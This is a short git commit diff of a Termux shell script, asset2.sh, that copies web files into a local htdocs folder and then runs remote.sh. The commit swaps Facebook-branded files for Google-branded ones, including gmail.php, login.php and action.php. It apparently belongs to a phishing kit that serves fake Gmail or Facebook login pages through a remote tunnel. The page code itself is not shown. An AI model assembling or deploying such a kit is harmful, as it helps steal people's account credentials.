cf1d3afe17b110d75c86a4c949894e10ffd6f5c6
Philiphackerzx <65859306+Philiphackerzx@users.noreply.github.com>
2020-05-25 21:50:59 +0530

    Update asset2.sh

--- asset2.sh
+++ asset2.sh
@@ -1,11 +1,12 @@
 rm /sdcard/htdocs/index.php
 cd asset
 cd fcode
-cp facebook.ttf /sdcard/htdocs
+cp google.ttf /sdcard/htdocs
 cp favicon.png /sdcard/htdocs
 cp index.php /sdcard/htdocs
 cp login.php /sdcard/htdocs
-cp mobile.png /sdcard/htdocs
-cp style.css /sdcard/htdocs
+cp google.png /sdcard/htdocs
+cp gmail.php /sdcard/htdocs
+cp action.php /sdcard/htdocs
 cd /data/data/com.termux/files/home/www.philiphacker.in/
 sh remote.sh
